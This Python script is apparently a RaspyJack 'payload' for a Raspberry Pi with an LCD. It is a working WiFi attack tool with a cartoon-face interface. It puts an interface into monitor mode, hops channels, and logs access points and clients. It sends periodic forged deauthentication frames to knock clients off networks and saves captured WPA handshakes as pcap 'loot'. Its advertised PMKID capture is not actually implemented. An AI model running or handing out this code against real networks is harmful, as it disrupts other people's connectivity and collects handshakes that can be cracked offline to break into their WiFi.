#!/usr/bin/env python3
"""
RaspyJack Payload -- Pwnagotchi
================================
Author: 7h30th3r0n3

Automated WiFi handshake and PMKID hunter with animated face UI.
Captures WPA handshakes via passive sniffing + optional deauth,
and PMKID via association requests.

Controls:
  OK         Start / Pause capture
  UP / DOWN  Scroll stats / change channel manually
  LEFT/RIGHT Toggle deauth ON/OFF
  KEY1       Toggle whitelist view
  KEY2       Export stats / clear session
  KEY3       Exit

Loot: /root/Raspyjack/loot/Pwnagotchi/
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import random
from datetime import datetime
from collections import deque

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_interface

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11ProbeReq,
        Dot11Auth, Dot11AssoReq, RadioTap, EAPOL,
        sendp, sniff as scapy_sniff, wrpcap, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT

LOOT_DIR = "/root/Raspyjack/loot/Pwnagotchi"
STATS_FILE = os.path.join(LOOT_DIR, "lifetime_stats.json")
CONFIG_FILE = os.path.join(LOOT_DIR, "config.json")
HANDSHAKE_DIR = os.path.join(LOOT_DIR, "handshakes")
CHANNELS = list(range(1, 14))
CHANNEL_DWELL = 3  # seconds per channel
DEAUTH_INTERVAL = 30  # seconds between deauth bursts
DEAUTH_COUNT = 5  # packets per burst

# ---------------------------------------------------------------------------
# Face ASCII art (drawn with PIL)
# ---------------------------------------------------------------------------
FACES = {
    "awake":     ("(  o  .  o  )", "normal"),
    "happy":     ("(  ^  .  ^  )", "captured something!"),
    "excited":   ("(  *  .  *  )", "so many networks!"),
    "cool":      ("(  -  .  -  )", "I'm so good at this"),
    "intense":   ("(  @  .  @  )", "deauthing..."),
    "bored":     ("(  -  .  -  )", "nothing to do..."),
    "lonely":    ("(  ;  .  ;  )", "no networks..."),
    "sad":       ("(  T  .  T  )", "lost a handshake"),
    "sleeping":  ("(  -  .  -  )", "zzZZZzz"),
    "grateful":  ("(  ^  .  ^  )", "thank you!"),
    "friend":    ("(  o  .  O  )", "friend nearby!"),
}

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
_running = True
capturing = False
deauth_enabled = True
current_channel = 1
mood = "awake"
mood_text = "waking up..."
start_time = time.time()

# Session stats
session_aps = {}        # {bssid: {essid, channel, signal, clients: set()}}
session_clients = {}    # {mac: bssid}
session_handshakes = 0
session_pmkid = 0
session_deauths = 0
captured_bssids = set()
eapol_buffer = {}       # {(src,dst): [packets]}
last_capture_ssid = ""

# Lifetime stats
lifetime_handshakes = 0
lifetime_pmkid = 0
lifetime_networks = 0

# Whitelist
whitelist_macs = set()
whitelist_ssids = set()

# Monitor interface
mon_iface = None

# View
view = "face"  # face | stats | whitelist


def _cleanup_signal(*_):
    global _running
    _running = False


signal.signal(signal.SIGINT, _cleanup_signal)
signal.signal(signal.SIGTERM, _cleanup_signal)

# ---------------------------------------------------------------------------
# Config / Stats persistence
# ---------------------------------------------------------------------------

def _load_stats():
    global lifetime_handshakes, lifetime_pmkid, lifetime_networks
    if os.path.isfile(STATS_FILE):
        try:
            with open(STATS_FILE, "r") as f:
                d = json.load(f)
            lifetime_handshakes = d.get("handshakes", 0)
            lifetime_pmkid = d.get("pmkid", 0)
            lifetime_networks = d.get("networks", 0)
        except Exception:
            pass


def _save_stats():
    os.makedirs(LOOT_DIR, exist_ok=True)
    data = {
        "handshakes": lifetime_handshakes,
        "pmkid": lifetime_pmkid,
        "networks": lifetime_networks,
        "last_session": datetime.now().isoformat(),
    }
    with open(STATS_FILE, "w") as f:
        json.dump(data, f, indent=2)


def _load_config():
    global whitelist_macs, whitelist_ssids, deauth_enabled
    if os.path.isfile(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                d = json.load(f)
            whitelist_macs = set(d.get("whitelist_macs", []))
            whitelist_ssids = set(d.get("whitelist_ssids", []))
            deauth_enabled = d.get("deauth_enabled", True)
        except Exception:
            pass


def _save_config():
    os.makedirs(LOOT_DIR, exist_ok=True)
    data = {
        "whitelist_macs": sorted(whitelist_macs),
        "whitelist_ssids": sorted(whitelist_ssids),
        "deauth_enabled": deauth_enabled,
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=2)


# ---------------------------------------------------------------------------
# Monitor mode
# ---------------------------------------------------------------------------

def _monitor_up(iface):
    for cmd in [
        ["sudo", "ip", "link", "set", iface, "down"],
        ["sudo", "iw", iface, "set", "monitor", "none"],
        ["sudo", "ip", "link", "set", iface, "up"],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)
    time.sleep(0.5)
    r = subprocess.run(["iwconfig", iface], capture_output=True, text=True, timeout=5)
    if "Mode:Monitor" in r.stdout:
        return iface
    # Try airmon-ng
    subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, timeout=15)
    for name in (f"{iface}mon", iface):
        r = subprocess.run(["iwconfig", name], capture_output=True, text=True, timeout=5)
        if "Mode:Monitor" in r.stdout:
            return name
    return None


def _monitor_down(iface):
    if not iface:
        return
    base = iface.replace("mon", "")
    subprocess.run(["sudo", "airmon-ng", "stop", iface], capture_output=True, timeout=10)
    for cmd in [
        ["sudo", "ip", "link", "set", base, "down"],
        ["sudo", "iw", base, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", base, "up"],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)


def _set_channel(iface, ch):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
                   capture_output=True, timeout=3)


# ---------------------------------------------------------------------------
# Mood engine
# ---------------------------------------------------------------------------

def _update_mood():
    global mood, mood_text
    with lock:
        aps = len(session_aps)
        hs = session_handshakes
        pm = session_pmkid
        deauths = session_deauths
        last = last_capture_ssid

    elapsed = time.time() - start_time

    if hs > 0 and time.time() % 30 < 5:
        mood = "happy"
        mood_text = f"got {hs} handshake(s)!"
    elif pm > 0 and time.time() % 30 < 5:
        mood = "grateful"
        mood_text = f"got {pm} PMKID!"
    elif last and time.time() % 20 < 3:
        mood = "excited"
        mood_text = f"pwned {last[:12]}"
    elif deauths > 0 and time.time() % 15 < 2:
        mood = "intense"
        mood_text = "deauthing targets..."
    elif aps > 10:
        mood = "excited"
        mood_text = f"{aps} networks nearby!"
    elif aps > 3:
        mood = "cool"
        mood_text = "scanning around..."
    elif aps > 0:
        mood = "awake"
        mood_text = "looking for targets"
    elif elapsed > 120:
        mood = "bored"
        mood_text = "nothing happening..."
    elif elapsed > 300:
        mood = "lonely"
        mood_text = "where is everyone?"
    elif not capturing:
        mood = "sleeping"
        mood_text = "zzZZZzz"
    else:
        mood = "awake"
        mood_text = "scanning..."


# ---------------------------------------------------------------------------
# Packet handler
# ---------------------------------------------------------------------------

def _is_whitelisted(bssid, essid=""):
    bssid_up = (bssid or "").upper()
    if bssid_up in whitelist_macs:
        return True
    if essid and essid in whitelist_ssids:
        return True
    return False


def _packet_handler(pkt):
    global session_handshakes, session_pmkid, lifetime_handshakes
    global lifetime_pmkid, lifetime_networks, last_capture_ssid

    if not _running or not capturing:
        return

    # Beacon frames -> discover APs
    if pkt.haslayer(Dot11Beacon):
        bssid = (pkt[Dot11].addr2 or "").upper()
        if not bssid or bssid == "FF:FF:FF:FF:FF:FF":
            return
        try:
            essid = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
        except Exception:
            essid = ""
        if not essid:
            essid = "<hidden>"
        if _is_whitelisted(bssid, essid):
            return
        sig = getattr(pkt, "dBm_AntSignal", -99)
        with lock:
            if bssid not in session_aps:
                session_aps[bssid] = {
                    "essid": essid, "channel": current_channel,
                    "signal": sig, "clients": set(),
                }
            else:
                session_aps[bssid]["signal"] = sig

    # Data frames -> discover clients
    if pkt.haslayer(Dot11) and pkt[Dot11].type == 2:
        src = (pkt[Dot11].addr2 or "").upper()
        dst = (pkt[Dot11].addr1 or "").upper()
        bss = (pkt[Dot11].addr3 or "").upper()
        if bss in session_aps and src != bss and src != "FF:FF:FF:FF:FF:FF":
            with lock:
                session_aps[bss]["clients"].add(src)
                session_clients[src] = bss

    # EAPOL -> handshake capture
    if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
        src = (pkt[Dot11].addr2 or "").upper()
        dst = (pkt[Dot11].addr1 or "").upper()
        pair = tuple(sorted([src, dst]))

        with lock:
            if pair not in eapol_buffer:
                eapol_buffer[pair] = []
            eapol_buffer[pair].append(pkt)

            if len(eapol_buffer[pair]) >= 4:
                # Full handshake captured!
                bssid = None
                for mac in pair:
                    if mac in session_aps:
                        bssid = mac
                        break
                if bssid and bssid not in captured_bssids:
                    captured_bssids.add(bssid)
                    essid = session_aps.get(bssid, {}).get("essid", "unknown")
                    session_handshakes += 1
                    lifetime_handshakes += 1
                    lifetime_networks += 1
                    last_capture_ssid = essid

                    # Save pcap
                    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    safe_essid = "".join(c if c.isalnum() else "_" for c in essid)[:20]
                    fname = f"hs_{safe_essid}_{ts}.pcap"
                    wrpcap(os.path.join(HANDSHAKE_DIR, fname), eapol_buffer[pair])
                    _save_stats()

                eapol_buffer[pair] = []


# ---------------------------------------------------------------------------
# Capture threads
# ---------------------------------------------------------------------------

def _channel_hopper():
    """Hop through 2.4GHz channels."""
    global current_channel
    idx = 0
    while _running and capturing:
        ch = CHANNELS[idx % len(CHANNELS)]
        _set_channel(mon_iface, ch)
        with lock:
            current_channel = ch
        idx += 1
        # Dwell on channel
        for _ in range(int(CHANNEL_DWELL * 10)):
            if not _running or not capturing:
                return
            time.sleep(0.1)


def _sniffer():
    """Capture packets via scapy."""
    if not SCAPY_OK or not mon_iface:
        return
    try:
        scapy_sniff(
            iface=mon_iface,
            prn=_packet_handler,
            stop_filter=lambda _: not _running or not capturing,
            store=0,
        )
    except Exception:
        pass


def _deauther():
    """Periodic deauth against discovered clients."""
    global session_deauths
    while _running and capturing:
        # Wait for interval
        for _ in range(DEAUTH_INTERVAL * 10):
            if not _running or not capturing or not deauth_enabled:
                time.sleep(0.1)
                continue
            time.sleep(0.1)

        if not deauth_enabled or not _running or not capturing:
            continue

        with lock:
            targets = []
            for bssid, info in session_aps.items():
                if _is_whitelisted(bssid, info.get("essid", "")):
                    continue
                if bssid in captured_bssids:
                    continue
                for client in list(info.get("clients", set()))[:3]:
                    targets.append((bssid, client, info.get("channel", 1)))

        if not targets:
            continue

        # Pick random target
        target = random.choice(targets[:10])
        bssid, client, ch = target

        try:
            _set_channel(mon_iface, ch)
            deauth = (RadioTap()
                      / Dot11(addr1=client, addr2=bssid, addr3=bssid,
                              type=0, subtype=12)
                      / Dot11Deauth(reason=7))
            sendp(deauth, iface=mon_iface, count=DEAUTH_COUNT,
                  inter=0.05, verbose=False)
            with lock:
                session_deauths += 1
        except Exception:
            pass


# ---------------------------------------------------------------------------
# LCD Drawing
# ---------------------------------------------------------------------------

def _draw_face(lcd, font_obj, font_sm):
    """Draw pwnagotchi face + stats."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _update_mood()

    face_art, _ = FACES.get(mood, FACES["awake"])

    with lock:
        ch = current_channel
        aps = len(session_aps)
        total_clients = len(session_clients)
        hs = session_handshakes
        pm = session_pmkid
        deauths = session_deauths
        lt_hs = lifetime_handshakes
        lt_pm = lifetime_pmkid
        last = last_capture_ssid
        cap = capturing
        deauth_on = deauth_enabled

    # Uptime
    elapsed = int(time.time() - start_time)
    hours = elapsed // 3600
    mins = (elapsed % 3600) // 60
    secs = elapsed % 60
    uptime_str = f"{hours:02d}:{mins:02d}:{secs:02d}"

    # Face (center, large)
    face_color = "#00FF00" if cap else "#666666"
    # Draw face centered
    d.text((10, 2), face_art, font=font_obj, fill=face_color)

    # Mood text below face
    d.text((4, 16), mood_text[:22], font=font_sm, fill="#AAAAAA")

    # Separator
    d.line([(0, 27), (127, 27)], fill="#333")

    # Stats grid
    y = 30

    # Channel + Mode
    mode = "AUTO" if cap else "IDLE"
    deauth_tag = "+DEAUTH" if deauth_on and cap else ""
    d.text((2, y), f"CH:{ch}", font=font_sm, fill="#FFAA00")
    d.text((40, y), f"{mode}{deauth_tag}", font=font_sm, fill="#58a6ff")
    y += 12

    # APs + Clients
    d.text((2, y), f"APs:{aps}", font=font_sm, fill="#00FF00")
    d.text((50, y), f"CLI:{total_clients}", font=font_sm, fill="#00CCFF")
    y += 12

    # Uptime
    d.text((2, y), f"UP:{uptime_str}", font=font_sm, fill="#888")
    y += 12

    # PWND line
    pwnd_color = "#00FF00" if hs > 0 else "#888"
    d.text((2, y), f"PWND:{hs}", font=font_sm, fill=pwnd_color)
    d.text((50, y), f"({lt_hs} total)", font=font_sm, fill="#666")
    y += 12

    # PMKID
    if pm > 0 or lt_pm > 0:
        d.text((2, y), f"PMKID:{pm}", font=font_sm, fill="#FFAA00")
        d.text((60, y), f"({lt_pm})", font=font_sm, fill="#666")
        y += 12

    # Last capture
    if last:
        d.text((2, y), f">{last[:20]}", font=font_sm, fill="#00FF00")
        y += 12

    # Deauth count
    if deauths > 0:
        d.text((2, y), f"DEAUTH:{deauths}", font=font_sm, fill="#FF4444")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if cap:
        d.text((2, 117), "OK:Pause L/R:Deauth K3:X", font=font_sm, fill="#888")
    else:
        d.text((2, 117), "OK:Start K1:WL K2:Exp K3:X", font=font_sm, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


def _draw_stats(lcd, font_obj, font_sm, scroll):
    """Draw detailed stats view."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "PWNAGOTCHI STATS", font=font_sm, fill="#00FF00")

    with lock:
        aps_list = sorted(session_aps.items(),
                          key=lambda x: len(x[1].get("clients", set())), reverse=True)

    lines = []
    for bssid, info in aps_list:
        essid = info.get("essid", "?")[:12]
        ch = info.get("channel", "?")
        cli = len(info.get("clients", set()))
        sig = info.get("signal", -99)
        pwned = "!" if bssid in captured_bssids else " "
        lines.append(f"{pwned}{essid} ch{ch} c{cli} {sig}dBm")

    visible = lines[scroll:scroll + 8]
    for i, line in enumerate(visible):
        y = 16 + i * 12
        color = "#00FF00" if line.startswith("!") else "#CCCCCC"
        d.text((2, y), line[:24], font=font_sm, fill=color)

    if not lines:
        d.text((4, 50), "No APs discovered yet", font=font_sm, fill="#666")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), f"APs:{len(aps_list)} U/D:Scrl K3:Bk", font=font_sm, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


def _draw_whitelist(lcd, font_obj, font_sm, scroll):
    """Draw whitelist view."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#442200")
    d.text((2, 1), "WHITELIST", font=font_sm, fill="#FFAA00")

    lines = []
    for mac in sorted(whitelist_macs):
        lines.append(f"MAC {mac[-11:]}")
    for ssid in sorted(whitelist_ssids):
        lines.append(f"SSID {ssid[:14]}")

    if not lines:
        d.text((4, 40), "Whitelist empty", font=font_sm, fill="#666")
        d.text((4, 55), "Edit config.json", font=font_sm, fill="#666")
        d.text((4, 70), f"in {LOOT_DIR}/", font=font_sm, fill="#444")
    else:
        visible = lines[scroll:scroll + 8]
        for i, line in enumerate(visible):
            y = 16 + i * 12
            d.text((2, y), line[:22], font=font_sm, fill="#CCCCCC")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), f"{len(lines)} entries KEY3:Back", font=font_sm, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running, capturing, deauth_enabled, mon_iface, view
    global session_handshakes, session_pmkid, session_deauths
    global session_aps, session_clients, eapol_buffer, captured_bssids

    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    _load_stats()
    _load_config()

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font_obj = scaled_font(10)
    font_sm = scaled_font(8)

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font_obj, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    # Select WiFi interface
    iface = select_interface(lcd, font_obj, PINS, GPIO, iface_type="wifi")
    if not iface:
        GPIO.cleanup()
        return 1

    # Enter monitor mode
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), "Monitor mode...", font=font_obj, fill="#FFAA00")
    lcd.LCD_ShowImage(img, 0, 0)

    mon_iface = _monitor_up(iface)
    if not mon_iface:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "Monitor mode fail", font=font_obj, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    scroll = 0

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view != "face":
                    view = "face"
                    time.sleep(0.3)
                else:
                    break

            elif btn == "OK":
                if not capturing:
                    capturing = True
                    threading.Thread(target=_channel_hopper, daemon=True).start()
                    threading.Thread(target=_sniffer, daemon=True).start()
                    threading.Thread(target=_deauther, daemon=True).start()
                else:
                    capturing = False
                time.sleep(0.3)

            elif btn in ("LEFT", "RIGHT") and view == "face":
                deauth_enabled = not deauth_enabled
                _save_config()
                time.sleep(0.3)

            elif btn == "KEY1":
                if view == "whitelist":
                    view = "face"
                else:
                    view = "whitelist"
                    scroll = 0
                time.sleep(0.3)

            elif btn == "KEY2" and view == "face":
                # Toggle stats view
                view = "stats"
                scroll = 0
                time.sleep(0.3)

            elif btn == "KEY2" and view == "stats":
                view = "face"
                time.sleep(0.3)

            elif btn == "UP":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                scroll += 1
                time.sleep(0.15)

            # Draw current view
            if view == "face":
                _draw_face(lcd, font_obj, font_sm)
            elif view == "stats":
                _draw_stats(lcd, font_obj, font_sm, scroll)
            elif view == "whitelist":
                _draw_whitelist(lcd, font_obj, font_sm, scroll)

            time.sleep(0.05)

    finally:
        _running = False
        capturing = False
        _save_stats()
        _save_config()
        time.sleep(0.5)
        _monitor_down(mon_iface)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
